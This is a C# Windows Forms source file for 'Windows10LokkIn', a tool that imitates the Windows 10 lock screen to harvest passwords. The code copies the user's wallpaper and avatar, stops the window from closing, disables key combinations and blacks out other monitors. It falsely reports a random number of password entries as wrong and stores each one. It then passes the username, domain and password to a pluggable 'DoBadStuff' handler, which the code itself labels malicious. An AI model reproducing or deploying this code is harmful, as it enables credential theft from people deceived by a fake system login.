using System;
using System.Collections.Generic;
using System.Data;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Windows10LokkIn.Classes;
using Windows10LokkIn.Interfaces;
using Windows10LokkIn.Models;

namespace Windows10LokkIn
{
    public partial class WindowsLogin : Form
    {
        #region "Variables and Stuff"

        /// <summary>
        /// Decides wether the form can be closed or not
        /// </summary>
        private bool DenyClose { get; set; }
        /// <summary>
        /// Contains the current bad stuff
        /// </summary>
        private IDoBadStuff DoBadStuff;
        /// <summary>
        /// Contains the current language translation
        /// </summary>
        private Language Language { get; set; }
        /// <summary>
        /// Contains the current configuration
        /// </summary>
        private Configuration Configuration { get; set; } = new Configuration();

        /// <summary>
        /// Contains the amount that passwords will be entered wrongly
        /// </summary>
        private int PasswordErrors { get; set; }
        /// <summary>
        /// Counts how many times the password has been entered wrongly
        /// </summary>
        private int PasswordErrorCounter { get; set; }
        /// <summary>
        /// The result of the user inputs
        /// </summary>
        private Result Result { get; set; } = new Result();

        #endregion

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        /// <summary>
        /// Gets called when main login form would be closing 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!Configuration.DebugMode) e.Cancel = DenyClose;
        }

        /// <summary>
        ///  Dont't know what this does
        /// </summary>
        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        #endregion

        #region "Events"

        /// <summary>
        /// Gets called when the login button is clicked or the enter key event is triggered on the password text box
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LoginButton_Click(object sender, EventArgs e)
        {

            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return; // Do nothing if no password has been entered
            if (PasswordTextBox.Text == Language.PlaceholderText) return; // Do nothing if the placeholder is set

            if (PasswordErrorCounter < PasswordErrors) // check if the password is wrong, save it and show error text
            {
                PasswordErrorCounter++;
                Result.WrongPasswords.Add(PasswordTextBox.Text);
                ShowPasswordError();
                return;
            }

            DenyClose = false;

            if (!Configuration.DebugMode) KeyPressHandler.Enable();

            try // fill result and call the bad stuff
            {
                Result.UserName = Environment.UserName;
                Result.DisplayName = UserNameLabel.Text;
                Result.DomainName = Environment.UserDomainName;
                Result.Password = PasswordTextBox.Text;

                // Time for malicious business 😏
                DoBadStuff.Now(Result);
            }
            catch (Exception ex) // if an error occurs it will only be displayed in debug mode
            {
                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                Close();
            }

        }

        /// <summary>
        /// Shows the password error text and controls
        /// </summary>
        private void ShowPasswordError()
        {
            SetPlaceholder(); // set placeholder text, so the current password is cleared
            ChangeVisiblityOfPasswordControls(true);
        }

        /// <summary>
        /// Is called when the password error message is accepted.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void WrongPasswordButton_Click(object sender, EventArgs e)
        {
            ChangeVisiblityOfPasswordControls(false);
            PasswordTextBox.Focus();
        }

        /// <summary>
        /// Hide and Show either password enter controls or password error controls
        /// </summary>
        /// <param name="wrongPassword"></param>
        private void ChangeVisiblityOfPasswordControls(bool wrongPassword)
        {
            PasswordTextBox.Visible = !wrongPassword;
            ShowPasswordButton.Visible = !wrongPassword;
            LoginButton.Visible = !wrongPassword;
            CapsLockLabel.Visible = !wrongPassword && IsKeyLocked(Keys.CapsLock);

            WrongPasswordLabel.Visible = wrongPassword;
            WrongPasswordButton.Visible = wrongPassword;
            if (wrongPassword) WrongPasswordButton.Focus();

            Refresh(); // trust me I am an engineer
        }

        /// <summary>
        /// Displayes or hides the language selection if the language button is clicked
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LanguageButton_Click(object sender, EventArgs e)
        {
            try
            {
                Controls.Find("languagePanel", true).FirstOrDefault().Visible = !Controls.Find("languagePanel", true).FirstOrDefault().Visible;
            }
            catch { }
        }

        /// <summary>
        /// Draws uniform borders around password controls
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 1;

            // draw a border around the password text box
            if (PasswordTextBox.Visible)
            {
                e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                    PasswordTextBox.Location.X - offset,
                    PasswordTextBox.Location.Y - offset,
                    PasswordTextBox.Width + offset,
                    PasswordTextBox.Height + offset));
            }

            // draw top and bottom border of show password button
            if (ShowPasswordButton.Visible)
            {
                e.Graphics.DrawLine(new Pen(LoginButton.FlatAppearance.BorderColor),
                    ShowPasswordButton.Location.X - offset, ShowPasswordButton.Location.Y - offset,
                    ShowPasswordButton.Location.X - offset + ShowPasswordButton.Width, ShowPasswordButton.Location.Y - offset);

                e.Graphics.DrawLine(new Pen(LoginButton.FlatAppearance.BorderColor),
                  ShowPasswordButton.Location.X, ShowPasswordButton.Location.Y + ShowPasswordButton.Height,
                  ShowPasswordButton.Location.X + ShowPasswordButton.Width, ShowPasswordButton.Location.Y + ShowPasswordButton.Height);
            }

        }

        /// <summary>
        /// If a language of the language panel is clicked the panel gets hidden
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LanguageClick(object sender, EventArgs e)
        {
            Controls.Find("languagePanel", true).FirstOrDefault().Visible = false;
        }

        #endregion

        #region "Password"

        /// <summary>
        /// Show password when button is pressed and the password is not the placeholder
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ShowPasswordButton_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text != Language.PlaceholderText)
                PasswordTextBox.UseSystemPasswordChar = !PasswordTextBox.UseSystemPasswordChar;
        }

        /// <summary>
        /// Shows capslock warning, performs login when enter is pressed and sets focus to start of textbox if placeholder is set
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            // Show caps lock warning
            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);

            // send password
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();

            // WinForms doesn't have *real* placeholders, so we have to tinker around
            // to make it seem like a real placeholder.
            // this prevents moving the text cursor
            if (PasswordTextBox.Text == Language.PlaceholderText)
            {
                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                {
                    PasswordTextBox.Select(0, 0);
                    e.Handled = true;
                }
            }
        }

        /// <summary>
        /// Decides wether to show the placeholder or not
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;

            if (string.IsNullOrEmpty(tb.Text))
            {
                SetPlaceholder();
            }

            if (tb.Text.Substring(1, tb.Text.Length - 1) == Language.PlaceholderText)
            {
                tb.UseSystemPasswordChar = true;
                tb.Text = tb.Text.Substring(0, 1); // keep the newly entered key as text and only remove the placeholder
                tb.ForeColor = Color.Black;
                tb.Select(1, 0);

                ShowPasswordButton.Visible = true;
                PasswordTextBox.Width -= ShowPasswordButton.Width;
            }
        }


        /// <summary>
        /// WinForms doesn't have *real* placeholders, so we have to tinker around
        /// to make it seem like a real placeholder.
        /// this prevents placing the text cursor somewhere where it shouldn't be
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void PasswordTextBox_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == Language.PlaceholderText) PasswordTextBox.Select(0, 0);
        }

        /// <summary>
        /// Put placeholder text into password textbox
        /// Hides the show password button
        /// </summary>
        private void SetPlaceholder()
        {
            PasswordTextBox.UseSystemPasswordChar = false;
            PasswordTextBox.Text = Language.PlaceholderText;
            PasswordTextBox.ForeColor = LoginButton.FlatAppearance.BorderColor;
            PasswordTextBox.Select(0, 0);

            ShowPasswordButton.Visible = false;
            PasswordTextBox.Width += ShowPasswordButton.Width;
        }

        #endregion

        #region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            // Blur background image after everything has been loaded
            ModifyBackground();
        }

        /// <summary>
        /// Handles the whole setup
        /// </summary>
        private void Initialize()
        {
            InitializeConfiguration();
            InitializeLanguage();
            InitializeMisc();
            InitializePasswordTextbox();
            InitializeKeyCombinations();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
            InitializeOtherUsers();
            InitializePasswordErrors();
        }

        /// <summary>
        /// Loads all languages
        /// </summary>
        private void InitializeLanguage()
        {
            List<ILanguage> languages = new List<ILanguage>();

            // load languages and use default if no was found or an error occured
            try
            {
                languages = InterfaceLoader.GetAll<ILanguage>();
                ILanguage language = languages.FirstOrDefault(x => x.Identifier == Configuration.DefaultLanguage);
                if (language is null) throw new Exception("Could not find languages");

                Language = new Language(language.Identifier);
                language.Apply(Language);
            }
            catch
            {
                EnglishLanguage l = new EnglishLanguage();
                Language = new Language(l.Identifier);
                l.Apply(Language);
            }

            // aply language to text of form
            CapsLockLabel.Text = Language.CapsLockText;
            WrongPasswordLabel.Text = Language.WrongPasswordText;

            LanguageButton.Text = Language.LanguageCode.ToUpper();

            // add language label to form an assign events
            Controls.Add(ControlFactory.CreateLanguagePanel("languagePanel", languages, LanguageButton.Location.X + LanguageButton.Width, LanguageButton.Location.Y, Language));
            Controls.Find("languagePanel", true).FirstOrDefault().Visible = false;

            foreach (ILanguage language in languages)
            {
                Controls.Find(language.Identifier + "1", true).FirstOrDefault().Click += LanguageClick;
                Controls.Find(language.Identifier + "2", true).FirstOrDefault().Click += LanguageClick;
            }
        }

        /// <summary>
        /// Loads a setup from a dll file thats implements the ISetup interface
        /// </summary>
        private void InitializeConfiguration()
        {

            try
            {
                ISetup setup = InterfaceLoader.Get<ISetup>();
                if (setup is null) throw new Exception("Could not find external configuration");

                setup.Initialize(Configuration);
            }
            catch
            {
                Configuration = new Configuration(); // use default confugration if setup is erroneous
            }

        }

        /// <summary>
        /// Sets up some small stuff no worth a own function
        /// </summary>
        private void InitializeMisc()
        {
            // disallow closing of the program
            DenyClose = true;

            // display CapsLock notification if necessary
            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);

            // hide wrong password text
            ChangeVisiblityOfPasswordControls(false);

            // only set top most when not in debug mode
            TopMost = !Configuration.DebugMode;
        }

        /// <summary>
        /// Show placeholder on startup
        /// </summary>
        private void InitializePasswordTextbox()
        {
            SetPlaceholder();
        }

        /// <summary>
        /// Check wether a .dll file implementing IDoBadStuff is available
        /// if its available, it replaces the default bad stuff object
        /// </summary>
        private void InitializeBadStuff()
        {
            try
            {
                DoBadStuff = InterfaceLoader.Get<IDoBadStuff>(true);

                if (DoBadStuff is null) DoBadStuff = new DefaultBadStuff();
            }
            catch (Exception ex)
            {
                DoBadStuff = new DefaultBadStuff();
                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        /// <summary>
        /// disables certain key combinations, disabled in debug mode
        /// </summary>
        private void InitializeKeyCombinations()
        {
            if (!Configuration.DebugMode) KeyPressHandler.Disable();
        }

        /// <summary>
        /// Load and display the user name on the form
        /// </summary>
        private void InitializeUserLabel()
        {
            try
            {
                if (Configuration.UseUserPrincipal) // tries to load the user name using UserPrincipal
                {
                    DateTime startTime = DateTime.Now;

                    Task t = new Task(() =>
                    {
                        UserNameLabel.Text = UserPrincipal.Current.DisplayName;
                    });

                    t.Start();

                    while (true) // if loading takes to long use Environment.UserName
                    {
                        if (startTime.AddSeconds(Configuration.UserPrincipalTimeout) > DateTime.Now) continue;
                        else if (!t.IsCompleted) throw new Exception("timeout");
                        else if (t.IsCompleted) break;
                    }

                }
                else
                {
                    UserNameLabel.Text = Environment.UserName;
                }
            }
            catch
            {
                UserNameLabel.Text = Environment.UserName;
            }
        }

        /// <summary>
        /// Load the users wallpaper
        /// </summary>
        /// <returns></returns>
        private Bitmap GetBackgroundImage()
        {
            return new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
        }

        /// <summary>
        /// Set the users wallpaper as the forms background
        /// </summary>
        private void InitializeBackground()
        {
            BackgroundImage = GetBackgroundImage();
        }

        /// <summary>
        /// Blur the users wallpaper and set it as the form background
        /// Also dim the background if its to bright
        /// </summary>
        private void ModifyBackground()
        {
            // blur image
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(Configuration.BlurIntensity);

            // dim image
            if (BackgroundImage.IsPixelBright(11, 387) || //Bottom left
                BackgroundImage.IsPixelBright(EaseOfAccessButton.Location.X, EaseOfAccessButton.Location.Y) ||
                BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(Configuration.DarknessIntensity);
        }

        /// <summary>
        /// Load the current users profile picture into the form
        /// </summary>
        private void InitializeUserIcon()
        {
            UserIconPictureBox.Image = GetUserIconByName(Environment.UserName);
        }

        /// <summary>
        /// Get a users profile picture from a directory
        /// </summary>
        /// <param name="fileEnding"></param>
        /// <param name="path"></param>
        /// <returns></returns>
        private Image GetUserIconFromPath(string fileEnding, string path)
        {
            try
            {
                DateTime highestCreation = DateTime.MinValue;
                string accountPicture = "";

                foreach (string f in Directory.GetFiles(path)) // get all files in directory
                {
                    if (fileEnding == "accountpicture-ms") // use newest accountpicture-ms to get user avatar
                    {
                        DateTime creationTime = File.GetCreationTime(f);
                        if (highestCreation < creationTime)
                        {
                            highestCreation = creationTime;
                            accountPicture = f;
                        }
                    }
                    else
                    {
                        if (!f.EndsWith($".{fileEnding}")) continue;
                        if (!Path.GetFileName(f).Contains(Environment.UserName)) continue;
                        return Image.FromFile(f);
                    }
                }

                if (string.IsNullOrEmpty(accountPicture)) return null;

                return AccountImageConverter.Convert(accountPicture);
            }
            catch
            {
                return Properties.Resources.defaultAvatar;
            }
        }

        /// <summary>
        /// Load the users avatar by its user name
        /// </summary>
        /// <param name="username"></param>
        /// <returns></returns>
        private Image GetUserIconByName(string username)
        {
            Image img = null;

            string path = Path.GetTempPath();

            // if no username is given or "other user" is selected (think domain account), load default avatar
            if (string.IsNullOrEmpty(username) || username == Language.OtherUserText)
                img = Properties.Resources.defaultAvatar;

            // Check for user avatar with multiple file extensions
            if (img is null)
                img = GetUserIconFromPath("bmp", path);

            if (img is null)
                img = GetUserIconFromPath("png", path);

            if (img is null)
                img = GetUserIconFromPath("jpg", path);

            // this is special
            if (img is null)
                img = GetUserIconFromPath("accountpicture-ms", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\AccountPictures"));

            if (img is null)
                img = Properties.Resources.defaultAvatar;

            return img;
        }

        /// <summary>
        /// Black out all non-primary screens, execpt in debug mode
        /// </summary>
        private void InitializeOtherScreens()
        {
            if (!Configuration.DebugMode)
            {
                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
                {
                    new Task(() => BlackScreen(screen)).Start();
                }
            }
        }

        /// <summary>
        /// Create a fullscreen black form
        /// </summary>
        /// <param name="screen"></param>
        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top), // set screen to where form is displayed on
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual, // necessary to set screen
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black,
                TopMost = true
            };

            blackForm.FormClosing += WindowsLogin_FormClosing; // deny closing

            blackForm.ShowDialog();
        }

        /// <summary>
        /// Add other users buttons and display them in the lower left corner
        /// </summary>
        private void InitializeOtherUsers()
        {
            AddChangeUserPanel(Language.OtherUserText, 0, GetUserIconByName(Language.OtherUserText));
            AddChangeUserPanel(UserNameLabel.Text, 1, GetUserIconByName(Environment.UserName));

            int counter = 0;
            // add emergency exit to user button -> click 50 times on your profile
            ((Button)Controls.Find("1", true).First()).Click += (s, e) =>
            {
                counter++;

                if (counter > 50)
                {
                    DenyClose = false;
                    if (!Configuration.DebugMode) KeyPressHandler.Enable();
                    Close();
                }

            };
        }

        /// <summary>
        /// Create a "other user" control with given properties, then place it on screen
        /// </summary>
        /// <param name="user"></param>
        /// <param name="panelCount"></param>
        /// <param name="userIcon"></param>
        private void AddChangeUserPanel(string user, int panelCount, Image userIcon)
        {
            Controls.Add(ControlFactory.CreateUserPanel(user, panelCount, UserNameLabel.Text, userIcon));
        }

        /// <summary>
        /// Sets the amount of needed password tries
        /// </summary>
        private void InitializePasswordErrors()
        {
            PasswordErrors = new Random().Next(Configuration.MinPasswordErrors, Configuration.MaxPasswordErrors + 1);
            PasswordErrorCounter = 0;
        }

    }

    #endregion

}
